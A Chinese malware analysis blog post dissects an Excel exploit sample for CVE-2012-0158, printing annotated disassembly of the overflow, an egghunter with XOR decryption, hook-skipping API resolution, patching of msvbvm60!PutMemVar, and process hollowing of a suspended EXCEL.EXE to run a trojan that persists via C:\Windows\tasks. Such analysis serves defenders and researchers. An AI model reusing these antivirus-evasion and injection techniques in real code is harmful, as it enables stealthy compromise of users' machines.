# 某EXCEL漏洞样本shellcode分析

0x00 起因
-------

* * *

近日我得到一个EXCEL样本，据称是一个过所有杀软的0day，经过分析之后让我大失所望，这是一个2012年的老漏洞，根本不是0day。虽然没捡到0day，但是这个样本中的shellcode还是相当有特色的，确实可以绕过大多数的杀毒软件和主动防御。 下面就来分析一下这个EXCEL EXP所使用漏洞和shellcode技术。

0x01 漏洞分析
---------

* * *

该漏洞是CVE-2012-0158，一个栈溢出漏洞，漏洞成因是MSCOMCTL.OCX在解析一个标志为Cobj的结构的时候直接使用文件内容的数据作为拷贝长度，导致拷贝数据的时候可以覆盖函数返回地址，造成了一个标准的栈溢出漏洞。

```
275C876D 55 push ebp
275C876E 8BEC mov ebp, esp
275C8770 51 push ecx
275C8771 53 push ebx
275C8772 8B5D 0C mov ebx, dword ptr [ebp+C]
275C8775 56 push esi
275C8776 33F6 xor esi, esi
275C8778 8B03 mov eax, dword ptr [ebx]
275C877A 57 push edi
275C877B 56 push esi
275C877C 8D4D FC lea ecx, dword ptr [ebp-4]
275C877F 6A 04 push 4
275C8781 51 push ecx
275C8782 53 push ebx
275C8783 FF50 0C call dword ptr [eax+C] ; ole32.CMemStm::Read
275C8786 3BC6 cmp eax, esi
275C8788 7C 78 jl short 275C8802
275C878A 8B7D 10 mov edi, dword ptr [ebp+10]
275C878D 397D FC cmp dword ptr [ebp-4], edi
275C8790 0F85 FDB70000 jnz 275D3F93
275C8796 57 push edi
275C8797 56 push esi
275C8798 FF35 00DE6227 push dword ptr [2762DE00]
275C879E FF15 68115827 call dword ptr [<&KERNEL32.HeapAlloc>] ; ntdll.RtlAllocateHeap
275C87A4 3BC6 cmp eax, esi
275C87A6 8945 0C mov dword ptr [ebp+C], eax
275C87A9 0F84 EEB70000 je 275D3F9D
275C87AF 8B0B mov ecx, dword ptr [ebx]
275C87B1 56 push esi
275C87B2 57 push edi
275C87B3 50 push eax
275C87B4 53 push ebx
275C87B5 FF51 0C call dword ptr [ecx+C] ; ole32.CMemStm::Read 读到刚分配的内存里
275C87B8 8BF0 mov esi, eax
275C87BA 85F6 test esi, esi
275C87BC 7C 31 jl short 275C87EF
275C87BE 8B75 0C mov esi, dword ptr [ebp+C]
275C87C1 8BCF mov ecx, edi
275C87C3 8B7D 08 mov edi, dword ptr [ebp+8]
275C87C6 8BC1 mov eax, ecx
275C87C8 C1E9 02 shr ecx, 2
275C87CB F3:A5 rep movs dword ptr es:[edi], dword ptr [esi] ;溢出
275C87CD 8BC8 mov ecx, eax
275C87CF 8B45 10 mov eax, dword ptr [ebp+10]
275C87D2 83E1 03 and ecx, 3
275C87D5 6A 00 push 0
275C87D7 8D50 03 lea edx, dword ptr [eax+3]
275C87DA 83E2 FC and edx, FFFFFFFC
275C87DD 2BD0 sub edx, eax
275C87DF F3:A4 rep movs byte ptr es:[edi], byte ptr [esi]
275C87E1 8B0B mov ecx, dword ptr [ebx]
275C87E3 52 push edx
275C87E4 68 68236327 push 27632368
275C87E9 53 push ebx
275C87EA FF51 0C call dword ptr [ecx+C]
275C87ED 8BF0 mov esi, eax
275C87EF FF75 0C push dword ptr [ebp+C]
275C87F2 6A 00 push 0
275C87F4 FF35 00DE6227 push dword ptr [2762DE00]
275C87FA FF15 74115827 call dword ptr [<&KERNEL32.HeapFree>] ; ntdll.RtlFreeHeap
275C8800 8BC6 mov eax, esi
275C8802 5F pop edi
275C8803 5E pop esi
275C8804 5B pop ebx
275C8805 C9 leave
275C8806 C3 retn

```

关于这个漏洞分析网上有很多，这里不作为分析重点，我们还是主要看一下此exp的shellcode是如何编写以绕过杀毒软件的。

0x02 Shellcode1
---------------

* * *

该exp使用了MSCOMCTL.DLL里的一个JMP ESP地址作为RET，这样可以使EXP做到与操作系统版本无关，只与OFFICE版本有关：

![enter image description here](http://drops.javaweb.org/uploads/images/3120d50a478cc44ce241ce12df512232bba0c978.jpg)

然后跳转回堆栈之后会先执行一小段EGGHUNTER SHELLCODE，去解码并跳转到真正的SHELLCODE。

```
001396AC 81EC 00100000 sub esp, 1000
001396B2 8BEC mov ebp, esp
001396B4 33C9 xor ecx, ecx
001396B6 64:8B35 3000000>mov esi, dword ptr fs:[30]
001396BD 8B76 0C mov esi, dword ptr [esi+C]
001396C0 8B76 1C mov esi, dword ptr [esi+1C]
001396C3 8B5E 08 mov ebx, dword ptr [esi+8]
001396C6 8B46 08 mov eax, dword ptr [esi+8]
001396C9 8B7E 20 mov edi, dword ptr [esi+20]
001396CC 8B36 mov esi, dword ptr [esi]
001396CE 66:394F 18 cmp word ptr [edi+18], cx
001396D2 ^ 75 F2 jnz short 001396C6
001396D4 895D 04 mov dword ptr [ebp+4], ebx
001396D7 8945 08 mov dword ptr [ebp+8], eax
001396DA FF75 08 push dword ptr [ebp+8]
001396DD 68 AD9B7DDF push DF7D9BAD
001396E2 E8 F7000000 call 001397DE ;下面开始获取一些API地址，包括GetFileSize等
001396E7 8945 20 mov dword ptr [ebp+20], eax
001396EA FF75 08 push dword ptr [ebp+8]
001396ED 68 54CAAF91 push 91AFCA54
001396F2 E8 E7000000 call 001397DE
001396F7 8945 24 mov dword ptr [ebp+24], eax
001396FA FF75 08 push dword ptr [ebp+8]
001396FD 68 AC08DA76 push 76DA08AC
00139702 E8 D7000000 call 001397DE
00139707 8945 28 mov dword ptr [ebp+28], eax
0013970A FF75 08 push dword ptr [ebp+8]
0013970D 68 1665FA10 push 10FA6516
00139712 E8 C7000000 call 001397DE
00139717 8945 2C mov dword ptr [ebp+2C], eax
0013971A 6A 04 push 4
0013971C 5E pop esi
0013971D 54 push esp
0013971E 56 push esi
0013971F FF55 20 call dword ptr [ebp+20] ;穷举文件句柄，通过GetFileSize获得文件大小
00139722 8985 94000000 mov dword ptr [ebp+94], eax
00139728 83F8 FF cmp eax, -1
0013972B 75 06 jnz short 00139733
0013972D 83C6 04 add esi, 4
00139730 56 push esi
00139731 ^ EB E9 jmp short 0013971C
00139733 3D 2F440000 cmp eax, 442F ;只处理大于0x442F的文件
00139738 ^ 76 F3 jbe short 0013972D
0013973A 6A 00 push 0
0013973C 6A 00 push 0
0013973E 68 27440000 push 4427
00139743 56 push esi
00139744 FF55 28 call dword ptr [ebp+28];SetFilePointer，从偏移0x4427读内容
00139747 8D85 90000000 lea eax, dword ptr [ebp+90]
0013974D 6A 00 push 0
0013974F 50 push eax
00139750 6A 08 push 8
00139752 8D85 9C000000 lea eax, dword ptr [ebp+9C]
00139758 50 push eax
00139759 56 push esi
0013975A FF55 2C call dword ptr [ebp+2C] ;ReadFile
0013975D 81BD 9C000000 F>cmp dword ptr [ebp+9C], 8BA7D5F6;判断特殊标记，就是xls自身文件
00139767 ^ 75 C4 jnz short 0013972D
00139769 89B5 98000000 mov dword ptr [ebp+98], esi
0013976F 6A 40 push 40
00139771 68 00100000 push 1000
00139776 FFB5 A0000000 push dword ptr [ebp+A0]
0013977C 6A 00 push 0
0013977E FF55 24 call dword ptr [ebp+24] ;VirtualAlloc
00139781 8985 A4000000 mov dword ptr [ebp+A4], eax
00139787 60 pushad
00139788 0F31 rdtsc ;这里做了反调试，通过时间判断是否在单步执行
0013978A 33C9 xor ecx, ecx
0013978C 03C8 add ecx, eax
0013978E 0F31 rdtsc
00139790 2BC1 sub eax, ecx
00139792 3D FF0F0000 cmp eax, 0FFF
00139797 61 popad
00139798 0F83 94000000 jnb 00139832
0013979E 8D9D 90000000 lea ebx, dword ptr [ebp+90]
001397A4 6A 00 push 0
001397A6 53 push ebx
001397A7 FFB5 A0000000 push dword ptr [ebp+A0]
001397AD 50 push eax
001397AE FFB5 98000000 push dword ptr [ebp+98]
001397B4 FF55 2C call dword ptr [ebp+2C] :ReadFile读出第二段shellcode
001397B7 8B9D A4000000 mov ebx, dword ptr [ebp+A4]
001397BD 60 pushad
001397BE 33C9 xor ecx, ecx ;下面开始解密第二段shellcode
001397C0 33C0 xor eax, eax
001397C2 8A040B mov al, byte ptr [ebx+ecx]
001397C5 34 8D xor al, 8D
001397C7 88040B mov byte ptr [ebx+ecx], al
001397CA 8BB5 A0000000 mov esi, dword ptr [ebp+A0]
001397D0 41 inc ecx
001397D1 3BCE cmp ecx, esi
001397D3 ^ 75 EB jnz short 001397C0
001397D5 61 popad
001397D6 FFB5 98000000 push dword ptr [ebp+98] ;把自身文件句柄作为参数
001397DC FFE3 jmp ebx ;跳转到第二段shellcode执行

```

可以看到第一段小shellcode的作用就是查找并解密真正的shellcode，并跳转过去。到目前为止，所用的方法都比较常规，除了用了一个反常简单的反调试以外，并没有什么特殊之处。

而真正有价值的是第二段shellcode，也就是包含真正功能的shellcode。

0x03 Shellcode2
---------------

* * *

第二段shellcode是此exp的真正精华所在，这段shellcode应该也是使用C语言编写的，长度非常的长，主要做了以下几件事情：

```
1. 获取API地址+5的地址，而不是调用API地址，而是每次调用时都判断有没有inline hook，可以绕过杀软的应用层hook和调试器int3断点。
2. 修改msvbvm60.dll的PutMemVar函数，把自身代码写进去，这样每次调用API都会从msvbvm60!PutMemVar发起，可以骗过某些根据调用栈判断exe/dll的杀软。
3. 从自身读出一个exe文件，并解密
4. 修复xls文件，使自身成为无漏洞的正常文件
5. 启动一个EXCEL.EXE进程，并把刚才读出的exe文件内容注入，通过修改PEB的ImageBase来执行exe代码。这样等于使用白名单进程做操作，所有杀软都会放行。
6. 结束自身进程

```

可以看出作者还是用了很多技巧来绕过杀软和反调试的，由于这些代码太长了，我只贴重点部分进行讲解。

通过HASH获取API地址：

```
047C0373 55 push ebp
047C0374 8BEC mov ebp, esp
047C0376 83EC 0C sub esp, 0C
047C0379 8B46 3C mov eax, dword ptr [esi+3C]
047C037C 8B4430 78 mov eax, dword ptr [eax+esi+78]
047C0380 8365 FC 00 and dword ptr [ebp-4], 0
047C0384 03C6 add eax, esi
047C0386 8B48 24 mov ecx, dword ptr [eax+24]
047C0389 53 push ebx
047C038A 8B58 1C mov ebx, dword ptr [eax+1C]
047C038D 57 push edi
047C038E 8B78 20 mov edi, dword ptr [eax+20]
047C0391 8B40 18 mov eax, dword ptr [eax+18]
047C0394 03CE add ecx, esi
047C0396 03FE add edi, esi
047C0398 03DE add ebx, esi
047C039A 894D F4 mov dword ptr [ebp-C], ecx
047C039D 8945 F8 mov dword ptr [ebp-8], eax
047C03A0 85C0 test eax, eax
047C03A2 76 1D jbe short 047C03C1
047C03A4 8B45 FC mov eax, dword ptr [ebp-4]
047C03A7 8B1487 mov edx, dword ptr [edi+eax*4]
047C03AA 03D6 add edx, esi
047C03AC E8 2B000000 call 047C03DC
047C03B1 3945 08 cmp dword ptr [ebp+8], eax
047C03B4 74 13 je short 047C03C9
047C03B6 FF45 FC inc dword ptr [ebp-4]
047C03B9 8B45 FC mov eax, dword ptr [ebp-4]
047C03BC 3B45 F8 cmp eax, dword ptr [ebp-8]
047C03BF ^ 72 E3 jb short 047C03A4
047C03C1 33C0 xor eax, eax
047C03C3 5F pop edi
047C03C4 5B pop ebx
047C03C5 C9 leave
047C03C6 C2 0400 retn 4
047C03C9 8B45 F4 mov eax, dword ptr [ebp-C]
047C03CC 8B4D FC mov ecx, dword ptr [ebp-4]
047C03CF 0FB70448 movzx eax, word ptr [eax+ecx*2]
047C03D3 8B0483 mov eax, dword ptr [ebx+eax*4]
047C03D6 8D4430 05 lea eax, dword ptr [eax+esi+5] ;可以看到这里获取API地址的时候+5，返回的是API地址+5，以绕过inline hook和软断点
047C03DA ^ EB E7 jmp short 047C03C3
047C03DC 33C0 xor eax, eax
047C03DE EB 09 jmp short 047C03E9
047C03E0 42 inc edx
047C03E1 C1C8 0D ror eax, 0D
047C03E4 0FBEC9 movsx ecx, cl
047C03E7 03C1 add eax, ecx
047C03E9 8A0A mov cl, byte ptr [edx]
047C03EB 84C9 test cl, cl
047C03ED ^ 75 F1 jnz short 047C03E0
047C03EF C3 retn

```

而后面每次调用的时候都会做判断，这里是CALL API的stub：

```
047C04EF 55 push ebp
047C04F0 8BEC mov ebp, esp
047C04F2 83C5 0C add ebp, 0C
047C04F5 8B4D 00 mov ecx, dword ptr [ebp]
047C04F8 8BC1 mov eax, ecx
047C04FA 85C0 test eax, eax
047C04FC 74 0C je short 047C050A
047C04FE 6BC0 04 imul eax, eax, 4
047C0501 FF7405 00 push dword ptr [ebp+eax]
047C0505 83E8 04 sub eax, 4
047C0508 ^ E2 F7 loopd short 047C0501 ;这里是处理参数，把参数逐个压栈
047C050A 8B45 FC mov eax, dword ptr [ebp-4]
047C050D E8 02000000 call 047C0514 ;调用后面
047C0512 5D pop ebp
047C0513 C3 retn
047C0514 66:8378 FB 8B cmp word ptr [eax-5], 0FF8B ;判断真正API地址有没有被inline hook还是正常头
047C0519 74 11 je short 047C052C
047C051B 8078 FB E9 cmp byte ptr [eax-5], 0E9 ;判断是不是跳转指令
047C051F 74 0B je short 047C052C
047C0521 8078 FB EB cmp byte ptr [eax-5], 0EB ;判断是不是跳转指令
047C0525 74 05 je short 047C052C
047C0527 83E8 05 sub eax, 5
047C052A FFE0 jmp eax ;如果没问题就跳回真正地址执行
047C052C 8BFF mov edi, edi ;执行正常函数头后跳转
047C052E 55 push ebp
047C052F 8BEC mov ebp, esp
047C0531 FFE0 jmp eax

```

下面shellcode加载并修改了msvbvm60!PutMemVar，把上面的call stub代码写进去：

```
047C03F8 8365 D4 00 and dword ptr [ebp-2C], 0
047C03FC 8365 D8 00 and dword ptr [ebp-28], 0
047C0400 8365 E0 00 and dword ptr [ebp-20], 0
047C0404 8365 E4 00 and dword ptr [ebp-1C], 0
047C0408 8365 E8 00 and dword ptr [ebp-18], 0
047C040C C645 EC 6D mov byte ptr [ebp-14], 6D
047C0410 C645 ED 73 mov byte ptr [ebp-13], 73
047C0414 C645 EE 76 mov byte ptr [ebp-12], 76
047C0418 C645 EF 62 mov byte ptr [ebp-11], 62
047C041C C645 F0 76 mov byte ptr [ebp-10], 76
047C0420 C645 F1 6D mov byte ptr [ebp-F], 6D
047C0424 C645 F2 36 mov byte ptr [ebp-E], 36
047C0428 C645 F3 30 mov byte ptr [ebp-D], 30
047C042C C645 F4 00 mov byte ptr [ebp-C], 0
047C0430 8365 F8 00 and dword ptr [ebp-8], 0
047C0434 8365 FC 00 and dword ptr [ebp-4], 0
047C0438 8D45 EC lea eax, dword ptr [ebp-14]
047C043B 50 push eax
047C043C 6A 01 push 1
047C043E 8B45 08 mov eax, dword ptr [ebp+8]
047C0441 FFB0 08020000 push dword ptr [eax+208]
047C0447 E8 A3000000 call 047C04EF ; LoadLibrary(“msvbvm60”)
047C044C 83C4 0C add esp, 0C
047C044F 8945 FC mov dword ptr [ebp-4], eax
047C0452 68 B974DEAE push AEDE74B9
047C0457 8B75 FC mov esi, dword ptr [ebp-4]
047C045A E8 14FFFFFF call 047C0373 ; GetProcAddress(“PutMemVar”)
047C045F 83E8 05 sub eax, 5
047C0462 8B4D 08 mov ecx, dword ptr [ebp+8]
047C0465 8981 C0020000 mov dword ptr [ecx+2C0], eax
047C046B 8D45 E4 lea eax, dword ptr [ebp-1C]
047C046E 50 push eax
047C046F 6A 40 push 40
047C0471 6A 44 push 44
047C0473 8B45 08 mov eax, dword ptr [ebp+8]
047C0476 FFB0 C0020000 push dword ptr [eax+2C0]
047C047C 6A 04 push 4
047C047E 8B45 08 mov eax, dword ptr [ebp+8]
047C0481 FFB0 30020000 push dword ptr [eax+230]
047C0487 E8 63000000 call 047C04EF ; VirtualProtect修改内存属性为可写
047C048C 83C4 18 add esp, 18
047C048F 85C0 test eax, eax
047C0491 75 04 jnz short 047C0497
047C0493 33C0 xor eax, eax
047C0495 EB 52 jmp short 047C04E9
047C0497 E8 05000000 call 047C04A1
047C049C E8 4E000000 call 047C04EF
047C04A1 5B pop ebx
047C04A2 8B43 01 mov eax, dword ptr [ebx+1]
047C04A5 03D8 add ebx, eax
047C04A7 83C3 05 add ebx, 5
047C04AA 895D D8 mov dword ptr [ebp-28], ebx
047C04AD 6A 44 push 44
047C04AF 8B55 D8 mov edx, dword ptr [ebp-28]
047C04B2 8B45 08 mov eax, dword ptr [ebp+8]
047C04B5 8BB0 C0020000 mov esi, dword ptr [eax+2C0]
047C04BB E8 73000000 call 047C0533
; 把前面提到的stub代码写到msvbvm60!PutMemVar
047C04C0 59 pop ecx
047C04C1 8D45 E4 lea eax, dword ptr [ebp-1C]
047C04C4 50 push eax
047C04C5 FF75 E4 push dword ptr [ebp-1C]
047C04C8 6A 44 push 44
047C04CA 8B45 08 mov eax, dword ptr [ebp+8]
047C04CD FFB0 C0020000 push dword ptr [eax+2C0]
047C04D3 6A 04 push 4
047C04D5 8B45 08 mov eax, dword ptr [ebp+8]
047C04D8 FFB0 30020000 push dword ptr [eax+230]
047C04DE E8 0C000000 call 047C04EF ; VirtualProtect把内存属性修改回来

```

下面shellcode做的是从文件某偏移处读出exe文件内容，并解密，这块代码没有什么特殊的就不贴了，只有解密算法稍微复杂了一点：

```
047C0A40 60 pushad
047C0A41 8B5D EC mov ebx, dword ptr [ebp-14]
047C0A44 33F6 xor esi, esi
047C0A46 BF 638EF47B mov edi, 7BF48E63
047C0A4B B9 07000000 mov ecx, 7
047C0A50 8BC7 mov eax, edi
047C0A52 8BD0 mov edx, eax
047C0A54 C1E8 1E shr eax, 1E
047C0A57 83E0 01 and eax, 1
047C0A5A C1EA 03 shr edx, 3
047C0A5D 83E2 01 and edx, 1
047C0A60 33C2 xor eax, edx
047C0A62 8BD7 mov edx, edi
047C0A64 83E2 01 and edx, 1
047C0A67 33C2 xor eax, edx
047C0A69 8BD7 mov edx, edi
047C0A6B D1E2 shl edx, 1
047C0A6D 0BC2 or eax, edx
047C0A6F 8BF8 mov edi, eax
047C0A71 ^ E2 E1 loopd short 047C0A54
047C0A73 25 FF000000 and eax, 0FF
047C0A78 300433 xor byte ptr [ebx+esi], al
047C0A7B 46 inc esi
047C0A7C 3B75 F0 cmp esi, dword ptr [ebp-10]
047C0A7F ^ 7C CA jl short 047C0A4B
047C0A81 61 popad

```

读出exe以后有漏洞的xls就没用，要把xls文件恢复成正常文件，一方面为了后面能够正常打开，另一方面也为了能够隐藏漏洞：

```
047C0AA7 6A 00 push 0
047C0AA9 6A 00 push 0
047C0AAB 6A 00 push 0
047C0AAD 6A 04 push 4
047C0AAF 6A 00 push 0
047C0AB1 FF75 0C push dword ptr [ebp+C]
047C0AB4 6A 06 push 6
047C0AB6 FFB7 60020000 push dword ptr [edi+260]
047C0ABC FF97 C0020000 call dword ptr [edi+2C0] ;CreateFileMapping映射xls文件
047C0AC2 83C4 20 add esp, 20
047C0AC5 85C0 test eax, eax
047C0AC7 0F84 92000000 je 047C0B5F
047C0ACD 6A 00 push 0
047C0ACF 6A 00 push 0
047C0AD1 6A 00 push 0
047C0AD3 6A 06 push 6
047C0AD5 50 push eax
047C0AD6 6A 05 push 5
047C0AD8 FFB7 90020000 push dword ptr [edi+290]
047C0ADE FF97 C0020000 call dword ptr [edi+2C0] ; MapViewofFile
047C0AE4 83C4 1C add esp, 1C
047C0AE7 85C0 test eax, eax
047C0AE9 74 74 je short 047C0B5F
047C0AEB 8945 FC mov dword ptr [ebp-4], eax
047C0AEE 8D5D F8 lea ebx, dword ptr [ebp-8]
047C0AF1 53 push ebx
047C0AF2 68 00020000 push 200
047C0AF7 8D9D F8FBFFFF lea ebx, dword ptr [ebp-408]
047C0AFD 53 push ebx
047C0AFE 6A 02 push 2
047C0B00 50 push eax
047C0B01 6A FF push -1
047C0B03 6A 06 push 6
047C0B05 FFB7 9C020000 push dword ptr [edi+29C]
047C0B0B FF97 C0020000 call dword ptr [edi+2C0] ;ntdll.ZwQueryVirtualMemory
047C0B11 83C4 20 add esp, 20
047C0B14 83F8 00 cmp eax, 0
047C0B17 75 46 jnz short 047C0B5F
047C0B19 6A 00 push 0
047C0B1B 6A 00 push 0
047C0B1D 68 04010000 push 104
047C0B22 FF75 18 push dword ptr [ebp+18]
047C0B25 6A FF push -1
047C0B27 8D85 F8FBFFFF lea eax, dword ptr [ebp-408]
047C0B2D 83C0 08 add eax, 8
047C0B30 50 push eax
047C0B31 6A 00 push 0
047C0B33 6A 00 push 0
047C0B35 6A 08 push 8
047C0B37 FFB7 94020000 push dword ptr [edi+294]
047C0B3D FF97 C0020000 call dword ptr [edi+2C0] ; WideCharToMultiByte
047C0B43 83C4 40 add esp, 40
047C0B46 0345 18 add eax, dword ptr [ebp+18]
047C0B49 48 dec eax
047C0B4A 66:C700 2200 mov word ptr [eax], 22
047C0B4F 8B4D 14 mov ecx, dword ptr [ebp+14]
047C0B52 83F9 00 cmp ecx, 0
047C0B55 74 08 je short 047C0B5F
047C0B57 8B7D FC mov edi, dword ptr [ebp-4]
047C0B5A 8B75 10 mov esi, dword ptr [ebp+10]
047C0B5D F3:A4 rep movs byte ptr es:[edi], byte ptr [esi] ;把正常文件内容拷贝过去，修复文件

```

修复完xls文件之后，就要做最后很关键的一部，以SUSPEND方式启动一个EXCEL进程，然后把刚才读出来的EXE内容写进新进程，再通过修改ImageBase指向EXE内容的地址，最后恢复新进程运行。这样一来，新启动的EXCEL进程实际执行的是木马EXE的进程。这样做的目的我分析有两个，直接释放exe并运行会被很多主动防御软件拦截，即使不拦截因为释放的exe不在白名单里，所做的敏感操作（例如修改注册表等）都会被主防拦截。而借EXCEL的壳执行exe则天然在主防白名单里，权限很高，木马不用考虑绕主防的问题。

```
047C0832 55 push ebp
047C0833 8BEC mov ebp, esp
047C0835 81EC 70030000 sub esp, 370
047C083B 57 push edi
047C083C 68 0C030000 push 30C
047C0841 8BF8 mov edi, eax
047C0843 8D85 90FCFFFF lea eax, dword ptr [ebp-370]
047C0849 50 push eax
047C084A 6A 00 push 0
047C084C 6A 03 push 3
047C084E FFB6 64020000 push dword ptr [esi+264]
047C0854 FF96 C0020000 call dword ptr [esi+2C0] ; GetModuleFileName获取EXCEL.EXE路径
047C085A 83C4 14 add esp, 14
047C085D 85C0 test eax, eax
047C085F 0F84 D7000000 je 047C093C
047C0865 6A 44 push 44
047C0867 59 pop ecx
047C0868 8BD1 mov edx, ecx
047C086A 8D45 9C lea eax, dword ptr [ebp-64]
047C086D 4A dec edx
047C086E C600 00 mov byte ptr [eax], 0
047C0871 90 nop
047C0872 40 inc eax
047C0873 85D2 test edx, edx
047C0875 ^ 75 F6 jnz short 047C086D ; ZeroMemory
047C0877 53 push ebx
047C0878 8D45 9C lea eax, dword ptr [ebp-64]
047C087B 50 push eax
047C087C 33C0 xor eax, eax
047C087E 50 push eax
047C087F 50 push eax
047C0880 6A 04 push 4 ;SUSPENDED
047C0882 50 push eax
047C0883 50 push eax
047C0884 50 push eax
047C0885 894D 9C mov dword ptr [ebp-64], ecx
047C0888 8D8E 00FDFFFF lea ecx, dword ptr [esi-300]
047C088E 51 push ecx
047C088F 50 push eax
047C0890 6A 0A push 0A
047C0892 FFB6 68020000 push dword ptr [esi+268]
047C0898 FF96 C0020000 call dword ptr [esi+2C0] ; CreateProcess以SUSPENDED方式启动EXCEL进程
047C089E 83C4 30 add esp, 30
047C08A1 85C0 test eax, eax
047C08A3 0F84 93000000 je 047C093C
047C08A9 57 push edi
047C08AA C707 07000100 mov dword ptr [edi], 10007
047C08B0 FF73 04 push dword ptr [ebx+4]
047C08B3 6A 02 push 2
047C08B5 FFB6 70020000 push dword ptr [esi+270]
047C08BB FF96 C0020000 call dword ptr [esi+2C0] ; GetContextThread获取寄存器
047C08C1 8D45 FC lea eax, dword ptr [ebp-4]
047C08C4 50 push eax
047C08C5 8B87 A4000000 mov eax, dword ptr [edi+A4];这个应该是EBX的值
047C08CB 6A 04 push 4
047C08CD FF75 08 push dword ptr [ebp+8]
047C08D0 83C0 08 add eax, 8
047C08D3 50 push eax
047C08D4 FF33 push dword ptr [ebx]
047C08D6 6A 05 push 5
047C08D8 FFB6 78020000 push dword ptr [esi+278]
047C08DE FF96 C0020000 call dword ptr [esi+2C0] ; ReadVirtualMemory读出ImageBase地址

```

这块的算法应该是：

```
DWORD* peb;
DWORD* ImageBaseAddress;
GetThreadContext(hTarget, &contx)
ImageBaseAddress = (DWORD *) contx.Ebx+8;

```

得到ImageBase地址之后，用新分配的exe地址去替换：

```
047C072A 8D45 E8 lea eax, dword ptr [ebp-18]
047C072D 50 push eax
047C072E 6A 04 push 4
047C0730 8D45 FC lea eax, dword ptr [ebp-4]
047C0733 50 push eax
047C0734 8B85 B0FDFFFF mov eax, dword ptr [ebp-250]
047C073A 83C0 08 add eax, 8
047C073D 50 push eax
047C073E FF75 EC push dword ptr [ebp-14]
047C0741 6A 05 push 5
047C0743 5F pop edi
047C0744 57 push edi
047C0745 FFB6 7C020000 push dword ptr [esi+27C]
047C074B FF96 C0020000 call dword ptr [esi+2C0] ; WriteProcessMemory修改ImageBase
047C0751 8B43 10 mov eax, dword ptr [ebx+10]
047C0754 0345 FC add eax, dword ptr [ebp-4]
047C0757 8945 E4 mov dword ptr [ebp-1C], eax
047C075A 8D45 E8 lea eax, dword ptr [ebp-18]
047C075D 50 push eax
047C075E 6A 04 push 4
047C0760 8D45 E4 lea eax, dword ptr [ebp-1C]
047C0763 50 push eax
047C0764 8B85 D0FDFFFF mov eax, dword ptr [ebp-230]
047C076A 83C0 04 add eax, 4
047C076D 50 push eax
047C076E FF75 EC push dword ptr [ebp-14]
047C0771 57 push edi
047C0772 FFB6 7C020000 push dword ptr [esi+27C]
047C0778 FF96 C0020000 call dword ptr [esi+2C0] ; WriteProcessMemory
047C077E 8D45 E8 lea eax, dword ptr [ebp-18]
047C0781 50 push eax
047C0782 6A 04 push 4
047C0784 8D45 FC lea eax, dword ptr [ebp-4]
047C0787 50 push eax
047C0788 68 10F0FD7E push 7EFDF010
047C078D FF75 EC push dword ptr [ebp-14]
047C0790 57 push edi
047C0791 FFB6 7C020000 push dword ptr [esi+27C]
047C0797 FF96 C0020000 call dword ptr [esi+2C0] ; WriteProcessMemory
047C079D 8B45 08 mov eax, dword ptr [ebp+8]
047C07A0 8B48 3C mov ecx, dword ptr [eax+3C]
047C07A3 8B45 10 mov eax, dword ptr [ebp+10]
047C07A6 8B55 FC mov edx, dword ptr [ebp-4]
047C07A9 83C4 54 add esp, 54
047C07AC 6A 00 push 0
047C07AE FF75 14 push dword ptr [ebp+14]
047C07B1 895401 34 mov dword ptr [ecx+eax+34], edx
047C07B5 50 push eax
047C07B6 FF75 FC push dword ptr [ebp-4]
047C07B9 FF75 EC push dword ptr [ebp-14]
047C07BC 57 push edi
047C07BD FFB6 7C020000 push dword ptr [esi+27C]
047C07C3 FF96 C0020000 call dword ptr [esi+2C0] ; WriteProcessMemory把本进程读出来的木马exe内容写到新进程空间
047C07C9 83C4 1C add esp, 1C
047C07CC 85C0 test eax, eax
047C07CE 74 47 je short 047C0817
047C07D0 8B43 10 mov eax, dword ptr [ebx+10]
047C07D3 0345 FC add eax, dword ptr [ebp-4]
047C07D6 C785 0CFDFFFF 0>mov dword ptr [ebp-2F4], 10007
047C07E0 8985 BCFDFFFF mov dword ptr [ebp-244], eax
047C07E6 8D85 0CFDFFFF lea eax, dword ptr [ebp-2F4]
047C07EC 50 push eax
047C07ED FF75 F0 push dword ptr [ebp-10]
047C07F0 6A 02 push 2
047C07F2 FFB6 74020000 push dword ptr [esi+274]
047C07F8 FF96 C0020000 call dword ptr [esi+2C0] ; SetContextThread恢复寄存器
047C07FE FF75 F0 push dword ptr [ebp-10]
047C0801 6A 01 push 1
047C0803 FFB6 8C020000 push dword ptr [esi+28C]
047C0809 FF96 C0020000 call dword ptr [esi+2C0] ; ResumeThread恢复进程运行

```

这时候新的EXCEL进程就成功运行了，但实际执行的内容却是木马EXE。

接下来shellcode调用TerminateProcess结束自身进程，就完成了全部工作。后面的事情就交给木马exe来完成。

0x04 木马exe
----------

* * *

虽然这个木马并没有什么特殊之处，我也顺便分析了一下。

首先在C:\Windows\tasks\下释放了一个exe文件，以保证木马每次随系统启动。然后删除注册表项HKCU\Software\Microsoft\Office\12.0\Excel\Resiliency避免EXCEL重启时报出错误。最后用EXCEL打开那个已经修复过的xls文件。

可以看到无论是在关键目录释放exe还是删除关键注册表项，如果是普通exe的话都是会被主防报警的，而正是因为在shellcode中借了EXCEL的壳，所以这些敏感操作才得以绕过主防。而且因为没有释放第一个exe文件，可以减少很多被杀毒的启发引擎查杀的机会。因为释放在tasks下的exe只需要实现木马功能即可，不用考虑释放执行的问题，而释放执行的操作才是最容易被启发式杀毒查杀的。

0x05 总结
-------

* * *

这个xls样本虽然是个老漏洞，但是其shellcode还是很有创意，值得学习的。最大的亮点有两个：

一个是重写系统dll的内存，来间接执行API调用，以跳过回溯堆栈的主防拦截shellcode。

另一个是借EXCEL进程的壳来执行木马exe，以绕过主防对木马的拦截。

from:http://blog.jowto.com/?p=81